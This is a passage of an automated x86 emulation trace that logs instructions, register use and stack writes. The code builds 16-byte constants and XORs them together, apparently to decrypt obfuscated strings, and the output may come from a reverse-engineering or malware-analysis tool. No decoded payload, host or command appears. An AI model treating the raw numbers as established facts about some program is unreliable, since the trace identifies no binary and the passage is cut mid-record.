[esp + 0x504], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xc0 and offset 0x8504 for stack size 0x10000 saving data to stack: 2231344414 4 0x45bc7d: mov dword ptr [esp + 0x508], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP -0xc0 and offset 0x8508 for stack size 0x10000 saving data to stack: 586689126 4 0x45bc88: mov dword ptr [esp + 0x50c], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP -0xc0 and offset 0x850c for stack size 0x10000 saving data to stack: 1701587195 4 0x45bc93: mov dword ptr [esp + 0x3a0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83a0 for stack size 0x10000 saving data to stack: 914789047 4 0x45bc9a: mov dword ptr [esp + 0x3a4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83a4 for stack size 0x10000 saving data to stack: 896093928 4 0x45bca1: mov dword ptr [esp + 0x3a8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45bca8: mov dword ptr [esp + 0x3ac], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45bcaf: mov dword ptr [esp + 0x3c0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83c0 for stack size 0x10000 saving data to stack: 914789047 4 0x45bcb6: mov dword ptr [esp + 0x3c4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83c4 for stack size 0x10000 saving data to stack: 896093928 4 0x45bcbd: mov dword ptr [esp + 0x3c8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45bcc4: mov dword ptr [esp + 0x3cc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45bccb: mov dword ptr [esp + 0x530], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc0 and offset 0x8530 for stack size 0x10000 saving data to stack: 914789047 4 0x45bcd2: mov dword ptr [esp + 0x534], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc0 and offset 0x8534 for stack size 0x10000 saving data to stack: 896093928 4 0x45bcd9: mov dword ptr [esp + 0x538], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc0 and offset 0x8538 for stack size 0x10000 saving data to stack: 929680980 4 0x45bce0: mov dword ptr [esp + 0x53c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc0 and offset 0x853c for stack size 0x10000 saving data to stack: 1389027477 4 0x45bce7: mov dword ptr [esp + 0x540], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0xc0 and offset 0x8540 for stack size 0x10000 saving data to stack: 1913178889 4 0x45bcf2: mov dword ptr [esp + 0x544], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xc0 and offset 0x8544 for stack size 0x10000 saving data to stack: 2231344414 4 0x45bcf9: mov dword ptr [esp + 0x548], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP -0xc0 and offset 0x8548 for stack size 0x10000 saving data to stack: 586689126 4 0x45bd04: mov dword ptr [esp + 0x54c], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP -0xc0 and offset 0x854c for stack size 0x10000 saving data to stack: 1701587195 4 0x45bd0f: mov dword ptr [esp + 0x3e0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83e0 for stack size 0x10000 saving data to stack: 914789047 4 0x45bd16: mov dword ptr [esp + 0x3e4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83e4 for stack size 0x10000 saving data to stack: 896093928 4 0x45bd1d: mov dword ptr [esp + 0x3e8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83e8 for stack size 0x10000 saving data to stack: 929680980 4 0x45bd24: mov dword ptr [esp + 0x3ec], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xc0 and offset 0x83ec for stack size 0x10000 saving data to stack: 1389027477 4 0x45bd2d: mov edi, 0x52cae095, regs_read: (), regs_write: [23] 0x45bd3e: push 0x4dc5ae, regs_read: [30], regs_write: [30] 0x45bd4a: mov esi, eax, regs_read: [19], regs_write: [29] 0x45bd51: push 0x4dc5af, regs_read: [30], regs_write: [30] 0x45bd62: push 0x4dc5b0, regs_read: [30], regs_write: [30] 0x45bd73: push 0x4dc5b1, regs_read: [30], regs_write: [30] 0x45bd84: push 0x4dc5b2, regs_read: [30], regs_write: [30] 0x45bd95: push 0x4dc5b3, regs_read: [30], regs_write: [30] 0x45bda6: movaps xmm1, xmmword ptr [esp + 0x4a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xd8 and offset 0x84a0 for stack size 0x10000 0x45bdb5: mov dword ptr [esp + 0x250], 0x5de5fbd9, regs_read: [30], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8250 for stack size 0x10000 saving data to stack: 1575353305 4 0x45bdc0: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45bdc2: mov dword ptr [esp + 0x254], 0x50042f86, regs_read: [30], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8254 for stack size 0x10000 saving data to stack: 1342451590 4 0x45bdcd: mov dword ptr [esp + 0x258], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8258 for stack size 0x10000 saving data to stack: 929680980 4 0x45bdd8: mov dword ptr [esp + 0x25c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xd8 and offset 0x825c for stack size 0x10000 saving data to stack: 1389027477 4 0x45bddf: pxor xmm1, xmmword ptr [esp + 0x250], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xd8 and offset 0x8250 for stack size 0x10000 0x45bde8: push eax, regs_read: [30, 19], regs_write: [30] 0x45bde9: movaps xmmword ptr [esp + 0x254], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xdc and offset 0x8254 for stack size 0x10000 saving data to stack: 0 16 0x45bdff: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45be04: mov dword ptr [esp + 0x4b0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xdc and offset 0x84b0 for stack size 0x10000 saving data to stack: 914789047 4 0x45be0f: mov dword ptr [esp + 0x4b8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xdc and offset 0x84b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45be16: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45be18: mov dword ptr [esp + 0x278], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xdc and offset 0x8278 for stack size 0x10000 saving data to stack: 929680980 4 0x45be26: mov dword ptr [esp + 0x4b4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xdc and offset 0x84b4 for stack size 0x10000 saving data to stack: 896093928 4 0x45be31: mov dword ptr [esp + 0x4bc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xdc and offset 0x84bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45be38: movaps xmm1, xmmword ptr [esp + 0x4b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xdc and offset 0x84b0 for stack size 0x10000 0x45be40: mov dword ptr [esp + 0x270], 0x5de5fbd9, regs_read: [30], regs_write: () adjusting stack for ESP -0xdc and offset 0x8270 for stack size 0x10000 saving data to stack: 1575353305 4 0x45be4b: mov dword ptr [esp + 0x274], 0x50042f86, regs_read: [30], regs_write: () adjusting stack for ESP -0xdc and offset 0x8274 for stack size 0x10000 saving data to stack: 1342451590 4 0x45be56: mov dword ptr [esp + 0x27c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xdc and offset 0x827c for stack size 0x10000 saving data to stack: 1389027477 4 0x45be5d: pxor xmm1, xmmword ptr [esp + 0x270], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xdc and offset 0x8270 for stack size 0x10000 0x45be66: push eax, regs_read: [30, 19], regs_write: [30] 0x45be67: movaps xmmword ptr [esp + 0x274], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xe0 and offset 0x8274 for stack size 0x10000 saving data to stack: 7308604897168157038 16 0x45be7b: push ecx, regs_read: [30, 22], regs_write: [30] 0x45be7c: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45be83: push dword ptr [esp + 0x314], regs_read: [30], regs_write: [30] 0x45be91: push dword ptr [esp + 0x314], regs_read: [30], regs_write: [30] 0x45be9d: movaps xmm1, xmmword ptr [esp + 0x4c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xec and offset 0x84c0 for stack size 0x10000 0x45beac: mov dword ptr [esp + 0x280], 0x53ebf3d9, regs_read: [30], regs_write: () adjusting stack for ESP -0xec and offset 0x8280 for stack size 0x10000 saving data to stack: 1407972313 4 0x45beb7: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45beb9: mov dword ptr [esp + 0x284], 0x6a0721b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xec and offset 0x8284 for stack size 0x10000 saving data to stack: 1778852279 4 0x45bec4: mov dword ptr [esp + 0x288], 0x531baf37, regs_read: [30], regs_write: () adjusting stack for ESP -0xec and offset 0x8288 for stack size 0x10000 saving data to stack: 1394323255 4 0x45becf: mov dword ptr [esp + 0x28c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xec and offset 0x828c for stack size 0x10000 saving data to stack: 1389027477 4 0x45bed6: pxor xmm1, xmmword ptr [esp + 0x280], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xec and offset 0x8280 for stack size 0x10000 0x45bedf: push eax, regs_read: [30, 19], regs_write: [30] 0x45bee0: movaps xmmword ptr [esp + 0x284], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xf0 and offset 0x8284 for stack size 0x10000 saving data to stack: 31086778428223632387781517678 16 0x45bef6: mov dword ptr [esp + 0x260], 0x53ebf3d9, regs_read: [30], regs_write: () adjusting stack for ESP -0xf0 and offset 0x8260 for stack size 0x10000 saving data to stack: 1407972313 4 0x45bf08: mov dword ptr [esp + 0x264], 0x6a0721b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xf0 and offset 0x8264 for stack size 0x10000 saving data to stack: 1778852279 4 0x45bf13: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45bf15: mov dword ptr [esp + 0x268], 0x531baf37, regs_read: [30], regs_write: () adjusting stack for ESP -0xf0 and offset 0x8268 for stack size 0x10000 saving data to stack: 1394323255 4 0x45bf20: mov dword ptr [esp + 0x26c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xf0 and offset 0x826c for stack size 0x10000 saving data to stack: 1389027477 4 0x45bf27: movaps xmm1, xmmword ptr [esp + 0x260], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xf0 and offset 0x8260 for stack size 0x10000 0x45bf2f: mov dword ptr [esp + 0x4d0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xf0 and offset 0x84d0 for stack size 0x10000 saving data to stack: 914789047 4 0x45bf3a: mov dword ptr [esp + 0x4d4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xf0 and offset 0x84d4 for stack size 0x10000 saving data to stack: 896093928 4 0x45bf45: mov dword ptr [esp + 0x4d8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xf0 and offset 0x84d8 for stack size 0x10000 saving data to stack: 929680980 4 0x45bf50: mov dword ptr [esp + 0x4dc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xf0 and offset 0x84dc for stack size 0x10000 saving data to stack: 1389027477 4 0x45bf57: pxor xmm1, xmmword ptr [esp + 0x4d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xf0 and offset 0x84d0 for stack size 0x10000 0x45bf60: push eax, regs_read: [30, 19], regs_write: [30] 0x45bf61: movaps xmmword ptr [esp + 0x264], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xf4 and offset 0x8264 for stack size 0x10000 saving data to stack: 31086778428223632387781517678 16 0x45bf75: push ecx, regs_read: [30, 22], regs_write: [30] 0x45bf76: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45bf7d: push dword ptr [esp + 0x30c], regs_read: [30], regs_write: [30] 0x45bf8b: push dword ptr [esp + 0x30c], regs_read: [30], regs_write: [30] 0x45bf97: movaps xmm1, xmmword ptr [esp + 0x4e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x100 and offset 0x84e0 for stack size 0x10000 0x45bfa6: mov dword ptr [esp + 0xd0], 0x52f4f3d4, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x80d0 for stack size 0x10000 saving data to stack: 1391784916 4 0x45bfb1: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45bfb3: mov dword ptr [esp + 0xd4], 0x581c20b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x80d4 for stack size 0x10000 saving data to stack: 1478238391 4 0x45bfbe: mov dword ptr [esp + 0xd8], 0x371bab36, regs_read: [30], regs_write: () adjusting stack for ESP -0x100 and offset 0x80d8 for stack size 0x10000 saving data to stack: 924560182 4 0x45bfc9: mov dword ptr [esp + 0xdc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x100 and offset 0x80dc for stack size 0x10000 saving data to stack: 1389027477 4 0x45bfd0: pxor xmm1, xmmword ptr [esp + 0xd0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x100 and offset 0x80d0 for stack size 0x10000 0x45bfd9: push eax, regs_read: [30, 19], regs_write: [30] 0x45bfda: movaps xmmword ptr [esp + 0xd4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x104 and offset 0x80d4 for stack size 0x10000 saving data to stack: 138296318119088462014603619 16 0x45bfe7: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45bff2: mov dword ptr [esp + 0x570], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x104 and offset 0x8570 for stack size 0x10000 saving data to stack: 914789047 4 0x45c004: mov dword ptr [esp + 0x574], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x104 and offset 0x8574 for stack size 0x10000 saving data to stack: 896093928 4 0x45c00f: mov dword ptr [esp + 0x578], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x104 and offset 0x8578 for stack size 0x10000 saving data to stack: 929680980 4 0x45c01a: mov dword ptr [esp + 0x57c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x104 and offset 0x857c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c021: movaps xmm1, xmmword ptr [esp + 0x570], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x104 and offset 0x8570 for stack size 0x10000 0x45c029: mov dword ptr [esp + 0xe0], 0x52f4f3d4, regs_read: [30], regs_write: () adjusting stack for ESP -0x104 and offset 0x80e0 for stack size 0x10000 saving data to stack: 1391784916 4 0x45c034: mov dword ptr [esp + 0xe4], 0x581c20b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x104 and offset 0x80e4 for stack size 0x10000 saving data to stack: 1478238391 4 0x45c03f: mov dword ptr [esp + 0xe8], 0x371bab36, regs_read: [30], regs_write: () adjusting stack for ESP -0x104 and offset 0x80e8 for stack size 0x10000 saving data to stack: 924560182 4 0x45c04a: mov dword ptr [esp + 0xec], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x104 and offset 0x80ec for stack size 0x10000 saving data to stack: 1389027477 4 0x45c051: pxor xmm1, xmmword ptr [esp + 0xe0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x104 and offset 0x80e0 for stack size 0x10000 0x45c05a: push eax, regs_read: [30, 19], regs_write: [30] 0x45c05b: movaps xmmword ptr [esp + 0xe4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x108 and offset 0x80e4 for stack size 0x10000 saving data to stack: 138296318119088462014603619 16 0x45c06f: push ecx, regs_read: [30, 22], regs_write: [30] 0x45c070: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45c077: push dword ptr [esp + 0x174], regs_read: [30], regs_write: [30] 0x45c085: push dword ptr [esp + 0x174], regs_read: [30], regs_write: [30] 0x45c096: mov dword ptr [esp + 0x360], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x8360 for stack size 0x10000 saving data to stack: 914789047 4 0x45c0a8: mov dword ptr [esp + 0x364], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x8364 for stack size 0x10000 saving data to stack: 896093928 4 0x45c0b3: mov dword ptr [esp + 0x368], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x8368 for stack size 0x10000 saving data to stack: 929680980 4 0x45c0be: mov dword ptr [esp + 0x36c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x114 and offset 0x836c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c0c5: movaps xmm1, xmmword ptr [esp + 0x360], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x114 and offset 0x8360 for stack size 0x10000 0x45c0cd: mov dword ptr [esp + 0xc0], 0x42f5f3db, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x80c0 for stack size 0x10000 saving data to stack: 1123415003 4 0x45c0d8: mov dword ptr [esp + 0xc4], 0x400628b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x80c4 for stack size 0x10000 saving data to stack: 1074145463 4 0x45c0e3: mov dword ptr [esp + 0xc8], 0x3769ce26, regs_read: [30], regs_write: () adjusting stack for ESP -0x114 and offset 0x80c8 for stack size 0x10000 saving data to stack: 929680934 4 0x45c0ee: mov dword ptr [esp + 0xcc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x114 and offset 0x80cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45c0f5: pxor xmm1, xmmword ptr [esp + 0xc0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x114 and offset 0x80c0 for stack size 0x10000 0x45c0fe: push eax, regs_read: [30, 19], regs_write: [30] 0x45c0ff: movaps xmmword ptr [esp + 0xc4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x118 and offset 0x80c4 for stack size 0x10000 saving data to stack: 2111390919187902980460 16 0x45c115: mov dword ptr [esp + 0xf0], 0x42f5f3db, regs_read: [30], regs_write: () adjusting stack for ESP -0x118 and offset 0x80f0 for stack size 0x10000 saving data to stack: 1123415003 4 0x45c127: mov dword ptr [esp + 0xf4], 0x400628b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x118 and offset 0x80f4 for stack size 0x10000 saving data to stack: 1074145463 4 0x45c132: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45c134: mov dword ptr [esp + 0xf8], 0x3769ce26, regs_read: [30], regs_write: () adjusting stack for ESP -0x118 and offset 0x80f8 for stack size 0x10000 saving data to stack: 929680934 4 0x45c13f: mov dword ptr [esp + 0xfc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x118 and offset 0x80fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45c146: movaps xmm1, xmmword ptr [esp + 0xf0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x118 and offset 0x80f0 for stack size 0x10000 0x45c14e: mov dword ptr [esp + 0x370], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x118 and offset 0x8370 for stack size 0x10000 saving data to stack: 914789047 4 0x45c159: mov dword ptr [esp + 0x374], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x118 and offset 0x8374 for stack size 0x10000 saving data to stack: 896093928 4 0x45c164: mov dword ptr [esp + 0x378], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x118 and offset 0x8378 for stack size 0x10000 saving data to stack: 929680980 4 0x45c16f: mov dword ptr [esp + 0x37c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x118 and offset 0x837c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c176: pxor xmm1, xmmword ptr [esp + 0x370], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x118 and offset 0x8370 for stack size 0x10000 0x45c17f: push eax, regs_read: [30, 19], regs_write: [30] 0x45c180: movaps xmmword ptr [esp + 0xf4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x11c and offset 0x80f4 for stack size 0x10000 saving data to stack: 2111390919187902980460 16 0x45c18d: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45c1b3: push eax, regs_read: [30, 19], regs_write: [30] 0x45c1b9: push dword ptr [esp + 0x184], regs_read: [30], regs_write: [30] 0x45c1c7: push dword ptr [esp + 0x184], regs_read: [30], regs_write: [30] 0x45c1d3: mov edi, 0x52cae095, regs_read: (), regs_write: [23] 0x45c1d8: mov dword ptr [esp + 0x380], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x128 and offset 0x8380 for stack size 0x10000 saving data to stack: 914789047 4 0x45c1e3: mov dword ptr [esp + 0x384], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x128 and offset 0x8384 for stack size 0x10000 saving data to stack: 896093928 4 0x45c1f5: mov dword ptr [esp + 0x388], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x128 and offset 0x8388 for stack size 0x10000 saving data to stack: 929680980 4 0x45c207: mov dword ptr [esp + 0x38c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x128 and offset 0x838c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c212: movaps xmm1, xmmword ptr [esp + 0x380], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x128 and offset 0x8380 for stack size 0x10000 0x45c21a: mov dword ptr [esp + 0x100], 0x1cacb89d, regs_read: [30], regs_write: () adjusting stack for ESP -0x128 and offset 0x8100 for stack size 0x10000 saving data to stack: 481081501 4 0x45c225: mov dword ptr [esp + 0x104], 0x1f4364c8, regs_read: [30], regs_write: () adjusting stack for ESP -0x128 and offset 0x8104 for stack size 0x10000 saving data to stack: 524510408 4 0x45c230: mov dword ptr [esp + 0x108], 0x1d43ee7e, regs_read: [30], regs_write: () adjusting stack for ESP -0x128 and offset 0x8108 for stack size 0x10000 saving data to stack: 490991230 4 0x45c23b: mov dword ptr [esp + 0x10c], 0x52eacabf, regs_read: [30], regs_write: () adjusting stack for ESP -0x128 and offset 0x810c for stack size 0x10000 saving data to stack: 1391119039 4 0x45c246: pxor xmm1, xmmword ptr [esp + 0x100], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x128 and offset 0x8100 for stack size 0x10000 0x45c24f: push eax, regs_read: [30, 19], regs_write: [30] 0x45c250: movaps xmmword ptr [esp + 0x104], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x12c and offset 0x8104 for stack size 0x10000 saving data to stack: 167008701308590643822258048410987050 16 0x45c25d: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45c25e: push eax, regs_read: [30, 19], regs_write: [30] 0x45c274: mov eax, dword ptr [esp + 0x5cc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x12c and offset 0x85cc for stack size 0x10000 0x45c280: mov ecx, dword ptr [esp + 0x5b8], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x12c and offset 0x85b8 for stack size 0x10000 0x45c288: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x12c and offset 0x801c for stack size 0x10000 saving data to stack: 0 4 0x45c28c: mov dword ptr [esp + 0x5c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x12c and offset 0x805c for stack size 0x10000 saving data to stack: 1701587195 4 0x45c29b: push eax, regs_read: [30, 19], regs_write: [30] 0x45c2a0: push eax, regs_read: [30, 19], regs_write: [30] 0x45c2a6: mov eax, dword ptr [esp + 0x24], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x134 and offset 0x8024 for stack size 0x10000 0x45c2aa: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45c2ab: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45c2ac: mov ecx, dword ptr [esp + 0x5c], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x12c and offset 0x805c for stack size 0x10000 0x45c2b0: push eax, regs_read: [30, 19], regs_write: [30] 0x45c2b1: push ecx, regs_read: [30, 22], regs_write: [30] 0x45c2b7: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45c2b8: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45c2b9: movaps xmm1, xmmword ptr [esp + 0x4f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x12c and offset 0x84f0 for stack size 0x10000 0x45c2c5: mov dword ptr [esp + 0x30], 0x5aeafbd5, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8030 for stack size 0x10000 saving data to stack: 1525349333 4 0x45c2cd: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45c2cf: mov dword ptr [esp + 0x34], 0x6a0e2081, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8034 for stack size 0x10000 saving data to stack: 1779310721 4 0x45c2d7: mov dword ptr [esp + 0x38], 0x450daa35, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8038 for stack size 0x10000 saving data to stack: 1158523445 4 0x45c2df: mov dword ptr [esp + 0x3c], 0xdb993f0, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x803c for stack size 0x10000 saving data to stack: 230265840 4 0x45c2e7: pxor xmm1, xmmword ptr [esp + 0x30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x12c and offset 0x8030 for stack size 0x10000 0x45c2ed: movaps xmmword ptr [esp + 0x30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x12c and offset 0x8030 for stack size 0x10000 saving data to stack: 0 16 0x45c2f2: movaps xmm1, xmmword ptr [esp + 0x500], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x12c and offset 0x8500 for stack size 0x10000 0x45c2fa: mov dword ptr [esp + 0x40], 0x7208af60, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8040 for stack size 0x10000 saving data to stack: 1913171808 4 0x45c302: mov dword ptr [esp + 0x44], 0x84ff9d1e, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8044 for stack size 0x10000 saving data to stack: 2231344414 4 0x45c30a: mov dword ptr [esp + 0x48], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x8048 for stack size 0x10000 saving data to stack: 586689126 4 0x45c312: mov dword ptr [esp + 0x4c], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP -0x12c and offset 0x804c for stack size 0x10000 saving data to stack: 1701587195 4 0x45c31a: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x12c and offset 0x8040 for stack size 0x10000 0x45c320: push eax, regs_read: [30, 19], regs_write: [30] 0x45c321: movaps xmmword ptr [esp + 0x44], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x130 and offset 0x8044 for stack size 0x10000 saving data to stack: 111544699671247354495664947526410059223 16 0x45c334: mov dword ptr [esp + 0x510], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x8510 for stack size 0x10000 saving data to stack: 914789047 4 0x45c33f: mov eax, 0x84ff9d1e, regs_read: (), regs_write: [19] 0x45c344: mov dword ptr [esp + 0x514], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x8514 for stack size 0x10000 saving data to stack: 896093928 4 0x45c34f: mov ecx, 0x22f82a66, regs_read: (), regs_write: [22] 0x45c354: mov dword ptr [esp + 0x518], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x8518 for stack size 0x10000 saving data to stack: 929680980 4 0x45c35f: mov edx, 0x656c28fb, regs_read: (), regs_write: [24] 0x45c364: mov dword ptr [esp + 0x51c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x130 and offset 0x851c for stack size 0x10000 saving data to stack: 1389027477 4 0x45c36b: movaps xmm1, xmmword ptr [esp + 0x510], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x130 and offset 0x8510 for stack size 0x10000 0x45c373: mov dword ptr [esp + 0x30], 0x5aeafbd5, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x8030 for stack size 0x10000 saving data to stack: 1525349333 4 0x45c37b: mov dword ptr [esp + 0x34], 0x6a0e2081, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x8034 for stack size 0x10000 saving data to stack: 1779310721 4 0x45c383: mov dword ptr [esp + 0x38], 0x450daa35, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x8038 for stack size 0x10000 saving data to stack: 1158523445 4 0x45c38b: mov dword ptr [esp + 0x3c], 0xdb993f0, regs_read: [30], regs_write: () adjusting stack for ESP -0x130 and offset 0x803c for stack size 0x10000 saving data to stack: 230265840 4 0x45c393: pxor xmm1, xmmword ptr [esp + 0x30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x130 and offset 0x8030 for stack size 0x10000 0x45c399: mov dword ptr [esp + 0x524], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x130 and offset 